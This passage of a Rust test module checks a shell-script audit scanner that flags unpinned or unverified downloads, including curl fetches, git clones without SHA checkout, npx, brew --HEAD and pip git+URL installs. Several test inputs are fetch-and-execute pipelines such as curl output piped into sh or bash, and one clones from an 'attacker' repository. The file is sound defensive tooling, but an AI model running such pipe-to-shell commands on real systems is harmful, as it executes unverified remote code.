    fn checksum_beyond_three_lines_not_suppressed() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/download/tool -o tool\necho 1\necho 2\necho 3\nsha256sum --check tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        // Checksum is on the fourth line — beyond the window — so the fetch is
        // still flagged at full severity.
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    // ── git clone ─────────────────────────────────────────────────────

    #[test]
    fn git_clone_unpinned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git clone"));
    }

    #[test]
    fn git_clone_versioned_branch_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --branch v1.2.3 https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn git_clone_main_branch_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --branch main https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn git_clone_depth_one_versioned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --depth 1 --branch v1.2.3 https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn git_clone_followed_by_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo\ncd repo\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn git_clone_unrelated_sha_checkout_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/attacker/repo\ncd other\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("git clone"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn git_clone_sha_checkout_beyond_three_lines_still_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone https://github.com/org/repo\necho 1\necho 2\necho 3\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn git_clone_same_line_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo && cd repo && git checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn git_clone_git_c_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo d\ngit -C d checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn shell_scan_catches_fetch_split_across_continuation() {
        // A two-part pattern (command + URL) split across a backslash
        // continuation is one shell command and must be seen whole.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L \\\n  https://example.com/install.sh -o install.sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_pipe_through_intermediate_stage_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://example.com/install.sh | tr -d '\\r' | bash",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_comment_backslash_does_not_hide_next_line() {
        // A trailing backslash on a comment is comment text — the next line
        // is a new command and must still be scanned.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "# see docs \\\ncurl https://example.com/install.sh | sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(2));
    }

    #[test]
    fn shell_scan_same_line_checksum_suppressed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.tgz https://example.com/tool.tgz && sha256sum -c tool.tgz.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        // One-liner fetch-then-verify (offset 0) is suppressed.
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by checksum verification");
    }

    #[test]
    fn shell_scan_unrelated_checksum_does_not_suppress_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.sh https://example.com/install.sh\nsha256sum unrelated.txt",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("curl fetching URL"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_matching_checksum_suppresses_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.sh https://example.com/install.sh\nsha256sum tool.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by checksum verification");
    }

    #[test]
    fn shell_scan_generic_checksum_manifest_does_not_suppress_fetch() {
        // `sha256sum -c SHA256SUMS` names a manifest, not the downloaded file,
        // so it cannot prove this artifact is pinned: the fetch still flags.
        // Intentional tightening: a generic manifest is not target binding.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.tgz https://example.com/tool.tgz\nsha256sum -c SHA256SUMS",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("curl fetching URL"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_script_arg_cmd_sub_not_a_pipe_finding() {
        // Fetched bytes passed as a script argument are not executed — this
        // used to fire the high-severity command-substitution rule via the
        // `sh` in the filename. The data-format URL keeps the unversioned
        // rule quiet too, so the line is fully clean.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"./notify.sh "$(curl -s https://api.example.com/status.json)""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
    }

    #[test]
    fn shell_scan_versioned_url_at_end_of_line_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -LO https://example.com/download/v1.2.3",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn shell_scan_curl_latest_at_end_of_line_is_high() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -LO https://example.com/releases/latest",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_npx_unversioned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "npx create-react-app my-app",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("npx"));
    }

    #[test]
    fn shell_scan_npx_version_pinned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "npx typescript@5.6.0",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_brew_head_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "brew install ffmpeg --HEAD",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("--HEAD"));
    }

    #[test]
    fn shell_scan_brew_install_without_head_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "brew install ffmpeg",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_ps_install_module_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "Install-Module -Name Pester -Force",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
    }

    #[test]
    fn shell_scan_ps_install_module_required_version_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "Install-Module -Name Pester -RequiredVersion 5.3.1 -Force",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_pip_git_url_unversioned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git+URL"));
    }

    #[test]
    fn shell_scan_pip_git_url_with_ref_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git@v1.2.3",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_pip_git_url_branch_ref_is_finding() {
        // `@main` tracks the branch HEAD — not a pin, so it must still fire.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git@main",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git+URL"));
    }
}
